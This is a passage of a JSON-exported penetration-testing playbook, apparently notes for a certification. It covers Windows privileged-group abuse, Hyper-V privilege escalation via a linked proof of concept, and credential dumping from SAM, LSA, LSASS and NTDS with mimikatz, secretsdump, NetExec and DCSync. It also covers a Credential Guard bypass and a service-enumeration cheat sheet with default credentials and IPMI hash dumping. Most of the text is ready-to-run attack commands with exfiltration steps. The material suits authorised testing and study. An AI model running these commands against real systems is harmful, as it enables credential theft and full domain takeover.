troubleshoot or monitor systems without elevating their privileges entirely.\n\nThis access can be abused to search through event logs for commands that might expose credentials or sensitive information.\n\n| **Action** | **Description** |\n| --- | --- |\n| `wevtutil qe Security /rd:true /f:text | Select-String \"<pattern>\"`\n\nUsing another user’s credential:`wevtutil ... /u:<username> /p:<password>` | Query security event logs looking for commands that might leak credentials. |\n| `Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*<pattern>*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`\n\nUsing another user’s credential:\n`$password = ConvertTo-SecureString '<password>' -AsPlainText -Force\n\n$cred = New-Object System.Management.Automation.PSCredential('<username>', $password)\n\nGet-WinEvent ... -Credential $cred` | Same thing, different tool.\n\nWe’re targeting process creation events (Event ID 4688) that may expose credentials in command-line arguments. |\n\nPatterns that might reveal credentials:\n\n- `/user`\n- `/password`\n- `/p`\n\n## **Hyper-V Administrators**\n\nThe Hyper-V Administrators group grants users full administrative access to all Hyper-V features without needing to be a local administrator.\n\nIf Domain Controllers are virtualized, Virtualization Administrators can be considered Domain Administrators. They have full control over the virtual machines, including the ability to alter, clone, or roll back Domain Controllers. This level of access gives them effective authority over the entire domain.\n\nBut even if that’s not the case, we can still pull some tricks to try elevating our privileges.\n\n| **Action** | **Description** |\n| --- | --- |\n| Download the [PoC](https://github.com/decoder-it/Hyper-V-admin-EOP/blob/master/hyperv-eop.ps1) and transfer it to the target.\n\nBe sure to replace `$targetfile` on line 253 for the file we want to read.\n\nRun the script, creating a hardlink to the target file and changing it’s permissions.\n`.\\hyperv-eop.ps1`\n\nNow that we have full control on the file, we can take ownership of it.\n`takeown /F <target-file-path>` | We can take ownership of any file by exploiting a flaw triggered when a virtual machine is deleted.\n\nDuring deletion, `mms.exe` runs as `SYSTEM` and attempts to reset permissions over a file we own.\n\nIf we make it a hardlink to another file, we trick the `SYSTEM` process into changing its permissions instead.\n\nRead more about this technique [here](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/). |\n| Find potentially exploitable service executables using the [Powershell script below](https://field-manual.brunorochamoura.com/manual/post-exploitation/windows-post-exploitation/windows-privilege-escalation/privileged-groups/hyper-v-administrators/#identify-restartable-system-service).\n\nTake ownership of the file and replace it with a malicious executable payload.\n\nMake the service restart to trigger the payload. | The best way to leverage the ability to take ownership of any file to get RCE as `SYSTEM` would be to replace the executable of some third-party service that we can restart and runs as `SYSTEM`.\n\nSystem files are protected by a special group called “Trusted Installer” and even administrators have only read and execute access over them. Third party applications are our best bet. |",
    "headings": [
      {
        "level": 1,
        "text": "Privileged Group"
      },
      {
        "level": 2,
        "text": "Backup Operators"
      },
      {
        "level": 2,
        "text": "Print Operators"
      },
      {
        "level": 2,
        "text": "Server Operators"
      },
      {
        "level": 2,
        "text": "DNS-Admins"
      },
      {
        "level": 3,
        "text": "Malicious DLL"
      },
      {
        "level": 3,
        "text": "Malicious WPAD Record"
      },
      {
        "level": 2,
        "text": "Event Log Readers"
      },
      {
        "level": 2,
        "text": "Hyper-V Administrators"
      }
    ],
    "commands": [],
    "tags": [
      "smb",
      "rce"
    ],
    "size": 9329,
    "lineCount": 167
  },
  {
    "id": "cpts-playbook-procedures-2f0f5174ff028033b629c92338cfa0ae",
    "title": "Procedures",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook",
    "filePath": "CPTS Playbook/Procedures 2f0f5174ff028033b629c92338cfa0ae.md",
    "content": "# Procedures\n\n[**Active Directory Compromise**](Procedures/Active%20Directory%20Compromise%202f0f5174ff0280969f75d09327ce5929.md)\n\n[**Linux Enumeration & PrivEsc**](Procedures/Linux%20Enumeration%20&%20PrivEsc%202f0f5174ff028091beb9f9da61577ffd.md)\n\n[**Windows Enumeration & PrivEsc**](Procedures/Windows%20Enumeration%20&%20PrivEsc%202f0f5174ff0280558116e98bd3bbece6.md)\n\n[Web Application Testing](Procedures/Web%20Application%20Testing%202f0f5174ff02800faf68c55b0f5a7d46.md)",
    "headings": [
      {
        "level": 1,
        "text": "Procedures"
      }
    ],
    "commands": [],
    "tags": [
      "privesc"
    ],
    "size": 476,
    "lineCount": 9
  },
  {
    "id": "cpts-playbook-post-exploitation-windows-windows-privesc-secrets-dumping-2eaf5174ff0280639c1eeba5a7b7453a",
    "title": "Secrets Dumping",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Post Exploitation / Windows / Windows PrivEsc",
    "filePath": "CPTS Playbook/Post Exploitation/Windows/Windows PrivEsc/Secrets Dumping 2eaf5174ff0280639c1eeba5a7b7453a.md",
    "content": "# Secrets Dumping\n\n## **SAM & LSA Dumping**\n\nDumping secrets from SAM and LSA requires elevated privileges (Administrator/`SYSTEM`) and is commonly used as a lateral movement technique after having compromised the machine.\n\n| **Action** | **Description** |\n| --- | --- |\n| On attacking machine:\n`nxc smb <target-ip> --local-auth -u <admin> -p <password> --sam\n\nnxc smb <target-ip> --local-auth -u <admin> -p <password> --lsa` | Remotely dumps SAM and LSA data using NetExec and admin credentials. |\n| On target:\n`reg.exe save hklm\\sam C:\\sam.hive\n\nreg.exe save hklm\\security C:\\security.hive\n\nreg.exe save hklm\\system C:\\system.hive`\n\nThen, exfiltrate the three files.\n\nOn attacking machine:\n`impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL` | Exfiltrates SAM and LSA hives for dumping on the attacking machine. |\n| On target:\n`.\\mimikatz.exe privilege::debug token::elevate lsadump::sam` | Extracts SAM data directly on target using Mimikatz. |\n\n**These hives can be dumped locally or copied for offline analysis once we have at least administrative rights on the target system.**\n\n| **Registry Hive** | **Description** |\n| --- | --- |\n| `HKEY_LOCAL_MACHINE\\SAM` | Stores local user account information and password hashes (SAM database). |\n| `HKEY_LOCAL_MACHINE\\SECURITY` | Stores LSA secrets such as cached domain credentials and service account passwords. |\n| `HKEY_LOCAL_MACHINE\\SYSTEM` | Contains system configuration, including the BootKey needed to decrypt `SAM` and `SECURITY` hives. |\n\n## **LSASS Memory Dumping**\n\n### From Linux\n\n| **Action** | **Description** |\n| --- | --- |\n| Any of these modules should do:\n`nxc smb ... -M lsassy\nnxc smb ... -M procdump\nnxc smb ... -M handlekatz\nnxc smb ... -M nanodump` | Remotely dump LSASS memory over SMB. |\n\n### From Windows\n\n| **Action** | **Description** |\n| --- | --- |\n| `.\\mimikatz.exe privilege::debug \"sekurlsa::logonpasswords\" exit` | Use [Mimikatz](https://github.com/ParrotSec/mimikatz) on the target to extract credentials directly from LSASS. |\n| On target, figure out `lass.exe`’s PID and dump memory to file.\n`Get-Process lsass | Select-Object Name, Idrundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <pid> C:\\lsass.dmp full`\n\nOn attacking machine, after exfiltration:\n`pypykatz lsa minidump lsass.dmp` | PowerShell-based method if Mimikatz isn’t available.\nRequires transferring the dump file off the target and parsing it with [Pypykatz](https://github.com/skelsec/pypykatz). |\n| On target:\n`Task Manager` > `Processes tab` > `Right click “Local Security Authority Process”` > `Create memory dump file`\n\nOn attacking machine, after exfiltration:`pypykatz lsa minidump lsass.dmp` | GUI-based method if Mimikatz isn’t available.\n\nRequires moving the dump file to attacker machine for analysis with [Pypykatz](https://github.com/skelsec/pypykatz). |\n\n### **Credential Guard Bypass**\n\nCredential Guard is a Windows Security Feature to protect sensitive authentication material from being extracted, even if an attacker gains administrative access to a system.\n\n**This isolation prevents traditional LSASS memory dumping techniques from accessing credential data, as LSASS no longer stores these secrets in an accessible portion of memory.**\n\nSo, standard credential dumping techniques no longer work, forcing us to rely on alternative methods to extract credentials.\n\n| **Action** | **Description** |\n| --- | --- |\n| `Get-ComputerInfo | Out-String | ForEach-Object { $_ -split \"`n\" } | Select-String \"CredentialGuard\"` | Check if Credential Guard is enabled on the system. |\n| `.\\mimikatz.exe privilege::debug misc::memssp exit` | Injects a custom SSP into LSASS to log credentials of users authenticating after the injection. |\n| `type C:\\Windows\\System32\\mimilsa.log` | View the log file to monitor authentication attempts after the SSP injection. |\n\n**The `misc::memssp` technique in [Mimikatz](https://github.com/ParrotSec/mimikatz) installs a custom Security Support Provider (SSP) into LSASS, allowing it to capture plaintext credentials as users log in. Unlike traditional memory dumping methods blocked by Credential Guard, this technique doesn’t attempt to extract existing secrets from protected memory. Instead, it passively logs new credentials during authentication, effectively bypassing Credential Guard by sidestepping its memory protections altogether.**\n\n## **NTDS Dumping**\n\n### DCSync Method\n\n| **Action** | **Description** |\n| --- | --- |\n| By default, NetExec will try the DCSync method first and VSS second:\n`nxc smb <target-ip> -u <username> -p <password> --ntds`\n\nFor the DCSync technique specifically:\n`nxc ... --ntds drsuapi` | We can dump the NTDS from our Linux attack host using NetExec. |\n| Dump the entire NTDS database:\n`.\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /all\"`\n\nDump only the hashes for the local administrator (or any other user):\n`\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /user:Administrator /domain:<domain-fqdn>\"` | We can also dump the NTDS directly from the Windows target using Mimikatz. |\n\n> For this technique to work, the user needs to have the `Replicating Directory Changes` and `Replicating Directory Changes All` rights.\n> \n\n### VSS Method\n\n| **Action** | **Description** |\n| --- | --- |\n| By default, NetExec will try the DCSync method first and VSS second:\n`nxc smb <target-ip> -u <username> -p <password> --ntds`\n\nFor the VSS technique specifically:\n`nxc ... --ntds vss` | We can dump the NTDS from our Linux attack host using NetExec. |\n| Creates a shadow volume for the C drive, which contains `NTDS.dit`:\n`vssadmin CREATE SHADOW /For=C:`\n\nPay attention to the “Shadow Copy Volume Name” field.\n\nCopies `NTDS.dit` from the shadow volume to the regular volume:\n`cmd.exe /c copy <shadow-copy-volume-name>\\Windows\\NTDS\\NTDS.dit <output-location>\\ntds.dit`\n\nDeletes the shadow volume after copying `NTDS.dit`:\n`vssadmin delete shadows /for=C:`\n\nAlso creates copy of `SYSTEM` and `SECURITY` registry hives:\n`reg.exe save hklm\\system C:\\system.save\nreg.exe save hklm\\security C:\\security.save` | We can also dump the NTDS directly from the Windows target.\n\nThis can be accomplished by creating a shadow copy of the `C:` drive, allowing us to copy the `NTDS.dit` file.\n\nOnce we exfiltrate the `NTDS.dit` file along with the `SYSTEM` and `SECURITY` registry hives to our attack host, we can dump its secrets. |\n| `impacket-secretsdump -security security.save -system system.save -ntds ntds.dit local` | Dumps secrets using all three exfiltrated files from the attack host. |\n\n> For this technique to work, the user needs to be an administrator on the Domain Controller.\n>",
    "headings": [
      {
        "level": 1,
        "text": "Secrets Dumping"
      },
      {
        "level": 2,
        "text": "SAM & LSA Dumping"
      },
      {
        "level": 2,
        "text": "LSASS Memory Dumping"
      },
      {
        "level": 3,
        "text": "From Linux"
      },
      {
        "level": 3,
        "text": "From Windows"
      },
      {
        "level": 3,
        "text": "Credential Guard Bypass"
      },
      {
        "level": 2,
        "text": "NTDS Dumping"
      },
      {
        "level": 3,
        "text": "DCSync Method"
      },
      {
        "level": 3,
        "text": "VSS Method"
      }
    ],
    "commands": [],
    "tags": [
      "mimikatz",
      "impacket",
      "smb",
      "lateral movement"
    ],
    "size": 6703,
    "lineCount": 131
  },
  {
    "id": "cpts-playbook-information-gathering-service-enumeration-2e0f5174ff0280668218ef1fd863a33b",
    "title": "Service Enumeration",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Information Gathering",
    "filePath": "CPTS Playbook/Information Gathering/Service Enumeration 2e0f5174ff0280668218ef1fd863a33b.md",
    "content": "# Service Enumeration\n\n# **FTP (21)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap -sC -sV -p 21 -v <target>` | Performs an Nmap scan on the FTP service to identify versions, scripts, and checks for anonymous login. Quite noisy. |\n| `sudo nmap -sV -p21 --script ftp-anon <target-ip>` | Runs an Nmap script to check for anonymous authentication on the target FTP server. |\n| `ftp <target>nc -nv <target> 21telnet <target> 21` | Different ways to connect to a remote FTP service. |\n| `wget -m --no-passive ftp://<user>:<password>@<target-ip>` | Recursively downloads all accessible files from the target FTP server using Wget. |\n\nCommon anonymous login credentials include:\n\n- `anonymous`:`anonymous`\n- `anonymous`:Blank\n- `ftp`:`ftp`\n- `guest`:`guest` Check the [Creds](https://field-manual.brunorochamoura.com/manual/information-gathering/service-enumeration/tools/creds/) tools for more default credentials.\n\nThe default ports for FTP are TCP port 21 for control commands and TCP port 20 for data transfer.\n\n# **SSH (22)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `ssh-audit <target>` | Perform a security audit of the target SSH service, checking for vulnerabilities and misconfigurations. |\n| `ssh <user>@<target>` | Log in to the SSH server using the SSH client. |\n| `ssh -i private.key <user>@<target>` | Log in to the SSH server using a private key for authentication. |\n| `ssh <user>@<target> -o PreferredAuthentications=password` | Force password-based authentication for login. |\n| `cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'` | If you have a shell on the target, check if root login or public key authentication is enabled on the server. |\n\n# **SMTP (25,465,587)**\n\nThe default ports for SMTP is 25, but secure encrypted like SMTPS may use ports 465 and 587.\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap -sC -sV -p25 -v <target>` | Uses Nmap to fingerprint the mail server. The default scripts include “smtp-commands,” which lists all valid SMTP commands that the server can execute. |\n| `telnet <target> 25` | Connects to the remote STMP service using telnet. |\n| `sudo nmap -p25 --script smtp-open-relay -v <target>` | Test whether the mail server is an open relay. |\n| `smtp-user-enum -M <mode> -U <wordlist> -t <target> -w <timeout-in-seconds> -v` | Enumerate potential usernames on the mail server using a wordlist. This method can be unreliable based on the server’s configuration.For mode, try `VRFY`, `EXPN` and `RCPT`. If you have a known user as |\n| `swaks --server <target> --auth LOGIN --auth-user <user>@<domain> --auth-password <password> --from <user>@<domain> --to <victim>@<domain> --attach @<attachment-file> --header 'Subject: <subject>' --body '<body>'` | Sends an email using `swaks`.If you need to specify a file, use `@` as a prefix. |\n| Wordlists to use: | `/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt` (Short, good for first round)\n`/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt` (Very long) |\n\n## **Common SMTP Commands**\n\n| **Action** | **Description** |\n| --- | --- |\n| `AUTH PLAIN <base64-encoded-credentials>` | Authenticates the user by sending credentials in cleartext, typically in base64 encoding. |\n| `HELO <domain-name>` | Initiates the session by identifying the client with its computer name (e.g., `HELO example.com`). |\n| `EHLO <domain-name>` | Extends the HELO command to provide additional information about the client’s capabilities (e.g., `EHLO example.com`). |\n| `MAIL FROM:<email-address>` | Specifies the sender’s email address (e.g., `MAIL FROM:<sender@example.com>`). |\n| `RCPT TO:<email-address>` | Specifies the recipient’s email address (e.g., `RCPT TO:<recipient@example.com>`). |\n| `DATA` | Starts the transmission of the email’s content. |\n| `RSET` | Cancels the current email transmission while keeping the connection open. |\n| `VRFY <email-address>` | Checks if a mailbox is available to receive messages (e.g., `VRFY user@example.com`). Can be used to attempt user enumeration via response codes. |\n| `EXPN <email-address>` | Verifies if a mailbox exists for receiving messages (e.g., `EXPN user@example.com`), similar to VRFY. |\n| `NOOP` | Requests a response from the server to keep the connection active and prevent a timeout. |\n| `QUIT` | Ends the session with the server. |\n\n# **DNS (53)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap -p53 -sV -sC -T4 -v <target-ip>` | Scans the target for DNS services and provides version and script information. |\n| General enumeration:`dnsrecon -d <domain>`\nBrute-force enumeration (more in-depth):`dnsrecon -d <domain> -D /usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt -t brt`\nUsing custom nameserver:`dnsrecon ... -n <nameserver>` | Performs automated and advanced DNS enumeration using [DNSRecon](https://github.com/darkoperator/dnsrecon). |\n| Retrieve all record types:`host <domain> <optional-nameserver>`\nQuery a specific record type (e.g., `A`, `TXT`, `NS`, `MX`):`host -t <record-type> <domain> <optional-nameserver>`\nAttempt a zone transfer:`host -l <domain> <nameserver>`\nMore accurate output instead of human-friendly:`host -v ...` | Uses the `host` command, a native Linux tool, to query DNS records, including specific record types, and attempt zone transfers. |\n| Retrieve all record types:`nslookup <domain> <optional-nameserver>`\nQuery a specific record type (e.g., `A`, `TXT`, `NS`, `MX`):`nslookup -type=<record-type> <domain> <optional-nameserver>`\nAttempt a zone transfer:`nslookup -type=AXFR <domain> <optional-nameserver>` | Uses `nslookup`, a native Windows tool, to query DNS records interactively or directly from the command line. It can also attempt zone transfers, though most servers block this. |\n| **Note 1:** According to [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482), `ANY` DNS queries may be deprecated. In that case, specific record types should be used. |  |\n| **Note 2**: `AXFR` refers to Asynchronous Full Transfer Zone. |  |\n\n# **TFTP (69)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `connect` | Specifies the remote host and optionally the port for file transfers. |\n| `get` | Downloads a file or set of files from the remote host to the local host. |\n| `put` | Uploads a file or set of files from the local host to the remote host. |\n| `quit` | Exits the TFTP client. |\n| `status` | Displays the current TFTP status, including transfer mode (ASCII or binary), connection status, and timeout value. |\n| `verbose` | Toggles verbose mode on or off, providing more detailed information during file transfers. |\n- **TFTP (Trivial File Transfer Protocol) is a simplified version of [FTP Enumeration (21)](https://field-manual.brunorochamoura.com/manual/information-gathering/service-enumeration/services/ftp-enumeration-21/), designed for fast and lightweight file transfers, but without the complexity of FTP’s features.**\n- **However, TFTP lacks essential security mechanisms like authentication and encryption, making it vulnerable to unauthorized access and data interception.** Due to this lack of security, TFTP is typically only used in controlled, local, or isolated networks where these risks are minimized.\n- Unlike FTP, TFTP does not support directory listing, and file management is more basic.\n\n# **Finger (79)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `nc -vn <IP> 79` | Performs banner grabbing via the Finger service. |\n| `finger @<IP>` | Lists all users on the target system (may not always work). |\n| `finger <USERNAME>@<IP>` | Queries the existence of a specific user on the target system. |\n| `msfconsole -x 'use auxiliary/scanner/finger/finger_users'` | Metasploit module for enumerating users using a wordlist (avoid the default wordlist, it’s less effective). |\n| Some good wordlists for the Metasploit module: | **Shorter usernames**: `/usr/share/wordlists/seclists/Usernames/Names/names.txt`**Larger username set**: `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt` |\n- **The Finger service provides detailed information about users on a computer or network**, typically including their login name, full name, and sometimes additional information, such as contact details or office location.\n- **You may leverage this service to enumerate local users on the target host.**\n- **However, Finger is considered largely obsolete and is rarely used on modern systems.** It’s mostly found on older, legacy systems.\n\n# **Kerberos (88)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap <target> -sV -v -p 88` | Nmap scans the Kerberos service. If detected, very likely to be a Domain Controller. |\n- **Kerberos is a stateless authentication protocol that serves as the primary authentication mechanism within Microsoft Active Directory environments.**\n- It ensures secure communication between clients and services by utilizing a trusted Key Distribution Center (KDC) located on Domain Controllers.\n- By employing tickets, Kerberos authentication effectively separates user credentials from resource requests, preventing passwords from being transmitted over the network.\n\nThe KDC issues two key cryptographic credentials:\n\n- **Ticket Granting Ticket (TGT)**:\n    - Allows users to request additional service tickets.\n    - Eliminates the need to re-enter credentials.\n- **Ticket Granting Service (TGS)**:\n    - Authorizes access to specific network services.\n    - Grants access by presenting the relevant ticket to the service.\n\n# **POP3 (110,995)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -v -p <port> <target>` | Performs an Nmap scan to identify POP3 service capabilities and information. |\n| `telnet <target> 110` | Connects to the POP3 service (unencrypted). |\n| `openssl s_client -connect <target>:995` | Connects to the POP3S service (encrypted) using SSL. |\n| **Note**: If you’re having issues with interacting with IMAP via the command line, consider using the [Evolution](https://wiki.gnome.org/Apps/Evolution) mail client. |  |\n\n## **Common POP3 Commands**\n\n| **Action** | **Description** |\n| --- | --- |\n| `USER <username>` | Identifies the user to the POP3 server. |\n| `PASS <password>` | Authenticates the user with the provided password. |\n| `STAT` | Requests the number of emails stored on the server. |\n| `LIST` | Retrieves the number and size of all emails on the server. |\n| `RETR <id>` | Requests the server to deliver the email specified by ID. |\n| `DELE <id>` | Requests the server to delete the email specified by ID. |\n| `CAPA` | Requests the server to display its capabilities. |\n| `RSET` | Resets the state of the session, clearing any previous commands or flags. |\n| `QUIT` | Closes the connection with the POP3 server. |\n\n# **NFS (111, 2049)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap --script nfs* -sV -p111,2049 -v <target>` | Footprint NFS with Nmap. |\n| `showmount -e <target>` | Show available NFS shares. |\n| This can’t be done via proxychains.`sudo mount -t nfs <target>:/<share> <local-dir> -o nolock` | Mount the specific NFS share to a directory in the local filesystem. |\n| `mount | grep nfs` | After mounting, get the settings for the share. |\n| `sudo umount <local-dir>` | Unmount the specific NFS share from the local filesystem. |\n| `lsof | grep '<target-NFS>'` | If unable to unmount due to target being busy, find the PID of processes using the share. |\n| `kill -9 <PID>` | Kill the processes to allow unmounting. |\n\n# **SMB (139, 445)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `nxc smb <target> -u '' -p '' --shares` | Anonymous login to SMB, lists available shares. |\n| `nxc smb <target> -u 'guest' -p '' --shares` | Guest login to SMB, lists available shares. |\n| `nxc smb <target> -u 'anonymous' -p '' --shares` | Anonymous login with ‘anonymous’ username to SMB, lists available shares. |\n| `nxc smb <target> -u <user> -p '<password>' --shares` | Login with specified username and password to SMB, lists available shares. |\n| `smbclient -L <target>` | Lists available SMB shares without authentication. |\n| `smbclient -L <target> -U '' -p ''` | Lists available SMB shares with anonymous authentication. |\n| `smbclient -L <target> -U '<user>' -p '<password>'` | Lists available SMB shares with normal user authentication. |\n| `smbclient -N //<target>/<share>` | Connects to a specific SMB share with anonymous authentication. |\n| `smbclient -U <user> //<target>/<share>` | Connects to a specific SMB share with user authentication. (Password prompt may appear) |\n| `sudo mount //<target>/<share> <local-dir> -o` | Mounts a SMB share to a local directory for file access. Useful for large files. |\n| `sudo mount //<target>/<share> <local-dir> -o username=<username>,password=<password>` | Mounts an SMB share with user authentication. Ideal for large file access. |\n| `sudo umount <local-dir>` | Unmounts the SMB share from the local directory. May result in a seg fault, but it’s not an issue. |\n\n> Note: \n1. If you’re facing timeouts when downloading large files, try mounting the SMB share. \n2. In an Active Directory environment, include the `-d <domain>` flag.\n> \n\n## **Interacting from Windows**\n\n| **Action** | **Description** |\n| --- | --- |\n| `net view \\\\<host> /all` | Displays all SMB shares, domain and resources of a host. |\n| `dir \\\\<host>\\<share>\\` | Displays the contents of the specified share. |\n| `net use n: \\\\<host>\\<share>\\` | Maps the specified file share to drive N: (or another unused letter). |\n| `net use n: \\\\<host>\\<share>\\ /user:<user> <password>` | Maps the file share to drive N: with authentication. |\n| `net use n: /delete` | Disconnects from the file share, replacing N: with the mapped drive letter. |\n\n## **RPC-Client**\n\n| **Action** | **Description** |\n| --- | --- |\n| `rpcclient -U \"\" -N <target>` | Connects to the SMB server without authentication, if allowed. |\n| `rpcclient -U \"<user>\" <target>` | Connects to the SMB server with authentication. |\n| `srvinfo` | Retrieves information about the target SMB server. |\n| `enumdomains` | Enumerates all domains deployed in the network. |\n| `querydominfo` | Provides detailed information about the domain, server, and users in the network. |\n| `netshareenumall` | Lists all available shares on the SMB server. |\n| `netsharegetinfo <share>` | Retrieves information about a specific SMB share. |\n| `enumdomusers` | Enumerates all domain users and their associated RID (e.g., `user[:<username>] rid:[<rid>]`). |\n| `queryuser <User_RID>` | Provides detailed information about a specific user based on their RID. |\n| `querygroup <Group_RID>` | Retrieves detailed information about a specific group based on its RID. |\n\n## **Spidering SMB Shares**\n\n| **Action** | **Description** |\n| --- | --- |\n| `nxc smb <target> -u <user> -p '<password>' --shares` | Checks if the account has access to shared folders. |\n| `nxc smb <target> -u <user> -p '<password>' --spider <share> --pattern <search-term>` | Spiders through a share to find files containing a specific string.TODO This syntax is lacking |\n| `nxc smb <target> -u <user> -p '<password>' --spider <share> --regex <regex>` | Spiders through a share to find files matching a regex pattern.TODO This syntax is lacking |\n| `nxc smb <target> -u <user> -p '<password>' --share <share> --get-file <remote-file> <local-file>` | Downloads a file from an SMB share.TODO This syntax is lacking |\n| `nxc smb <target> -u <user> -p '<password>' --share <share> --put-file <local-file> <remote-file>` | Uploads a file to an SMB share.TODO relevant here? |\n| `nxc smb <target> -u <user> -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=TRUE` | Downloads all files from all non-excluded shares to `/tmp/cme_spider_plus`. |\n\n# **IMAP (143, 993)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap --script \"imap-capabilities or imap-ntlm-info\" -sV -v -p <port> <target>` | Performs an Nmap scan to gather information about the IMAP service. |\n| `telnet <target> 143` | Connects to the unencrypted IMAP service. |\n| `openssl s_client -connect <target>:993` | Connects to the encrypted IMAPS service using SSL. |\n\n## **Common IMAP Commands**\n\n| **Action** | **Description** |\n| --- | --- |\n| `1 LOGIN <username> <password>` | Authenticates the user with the provided username and password. |\n| `1 LIST \"\" *` | Lists all available mailboxes on the server. |\n| `1 CREATE \"<mailbox>\"` | Creates a new mailbox with the specified name. |\n| `1 DELETE \"<mailbox>\"` | Deletes the specified mailbox. |\n| `1 RENAME \"<old>\" \"<new>\"` | Renames a mailbox from old name to new name. |\n| `1 LSUB \"\" *` | Lists the subscribed mailboxes for the user. |\n| `1 SELECT <mailbox>` | Selects the specified mailbox for accessing messages. |\n| `1 UNSELECT <mailbox>` | Deselects the currently selected mailbox. |\n| `1 FETCH <ID> all` | Fetches all data associated with the message identified by the given ID. |\n| `1 CLOSE` | Closes the current mailbox and removes any marked messages. |\n| `1 LOGOUT` | Ends the session and logs the user out from the IMAP server. |\n\n# **SNMP (161,162,10161,10162)**\n\nsnmpwalk -v2c -c public 192.168.135.156 NET-SNMP-EXTEND-MIB::nsExtendObjects\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap -sUV -p 161,162,10161,10162 -v <target>` | Performs an Nmap scan on the SNMP service to the identify version. We want it to be v1 or v2c. |\n| `snmpcheck <target>` | Automatically retrieves information from the SNMP service and displays it in a more organized way.This does **not** replace brute-force scanning. |\n| `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <target>` | Performs a brute force attack on the SNMP community string. The community string is enclosed in square brackets. |\n| `snmpwalk -v <1|2c|3> -c <community-string> -oA <target>` | Initiates an SNMP scan on a target, starting from the root of the MIB tree. |\n| `sudo apt install download-mibssnmpwalk ... NET-SNMP-EXTEND-MIB::nsExtendOutputFull` | Installs MIB files (including NET-SNMP-EXTEND-MIB) and then uses `snmpwalk` to enumerate the output of custom scripts or commands defined on the remote SNMP agent.**Very important**, often reveals new information. |\n| `snmpwalk -v <1|2c|3> -c <community-string> -oA <target> <OID>` | Conducts an SNMP scan on a target, starting from a specific Object Identifier (OID). |\n| System Processes: `1.3.6.1.2.1.25.1.6.0`Running Programs: `1.3.6.1.2.1.25.4.2.1.2`Processes Path: `1.3.6.1.2.1.25.4.2.1.4`Storage Units: `1.3.6.1.2.1.25.2.3.1.4`Software Name: `1.3.6.1.2.1.25.6.3.1.2`User Accounts: `1.3.6.1.4.1.77.1.2.25`TCP Local Ports: `1.3.6.1.2.1.6.13.1.3` | These some noteworthy OIDs used by Microsoft Windows SNMP.If the target is a Windows machine, try these before brute-forcing all OIDs. |\n| `snmpwalk -v2c -c public 192.168.135.156 NET-SNMP-EXTEND-MIB::nsExtendObjects` | MOST Important command |\n\n# **LDAP (389, 636, 3268, 3269)**\n\nTODO nxc stuff here [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html)\n\n| **Command** | **Description** |\n| --- | --- |\n| `ldapsearch -x -H ldap://<target>` | Anonymous bind, basic info |\n| `ldapsearch -x -H ldap://<target> -b \"dc=domain,dc=com\"` | Anonymous bind with base DN |\n| `ldapsearch -x -H ldap://<target> -D \"user@domain\" -w \"pass\" -b \"dc=domain,dc=com\"` | Authenticated bind |\n| `nxc ldap <target> -u '' -p ''` | Anonymous LDAP enumeration |\n| `nxc ldap <target> -u 'user' -p 'pass'` | Authenticated LDAP enumeration |\n| `python windapsearch.py -d domain.com --dc-ip <target>` | Comprehensive Windows LDAP enumeration |\n\n# **IPMI (623)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap -sU --script ipmi-version -p 623 <target>` | Perform an IPMI version scan using Nmap. |\n| `msfconsole -x \"use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS <target>; run;\"` | Scan for IPMI version using Metasploit. |\n| `msfconsole -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <target>; run;\"` | Extract password hashes by exploiting a flaw in RAKP version 2.0. |\n| `root`:`calvinADMIN`:`ADMIN` | Try the following default credentials. \nMore information about these accounts below. |\n| **Note:** Use Hashcat mode `7300` to crack RAKP hashes. |  |\n\nThe default credentials for some common vendors:\n\n- **Dell iDRAC**\n    - Username: `root`\n    - Password: `calvin`\n- **HP iLO**\n    - Username: `Administrator`\n    - Password: Randomized 8-character string consisting of numbers and uppercase letters\n- **Supermicro IPMI**\n    - Username: `ADMIN`\n    - Password: `ADMIN` Check the [Creds](https://field-manual.brunorochamoura.com/manual/information-gathering/service-enumeration/tools/creds/) tools for more default credentials.\n\n# **Rsync (873)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap -sV -p 873 <target>` | Scan for Rsync version to determine protocol version. |\n| `nc -nv <target> 873` | Probe for accessible Rsync modules. |\n| `msfconsole -x \"use auxiliary/scanner/rsync/modules_list; set RHOSTS <target>; run;\"` | Enumerate shared Rsync modules using Metasploit. |\n| `rsync -av --list-only rsync://<target>/<module>` | List files from an open Rsync module. |\n| `rsync -av rsync://<target>/<module> ./rsyn_shared` | Copy all files from an open Rsync module to 